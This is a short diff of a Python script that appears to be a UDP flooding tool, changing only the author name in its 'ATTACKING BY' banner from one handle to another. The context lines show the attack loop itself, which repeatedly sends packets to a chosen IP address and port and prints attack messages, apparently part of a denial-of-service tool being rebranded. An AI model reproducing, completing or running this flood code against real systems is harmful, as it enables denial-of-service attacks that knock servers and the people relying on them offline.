@@ -38,7 +38,7 @@ def run1():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[91m}━>\033[32mATTACKING BY Maxxy \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[!] Server Attack!")
 
@@ -51,7 +51,7 @@ def run2():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}━>\033[32mATTACKING BY SYNTAX \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[91m}━>\033[32mATTACKING BY Maxxy \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[!] Server Attack!")
 
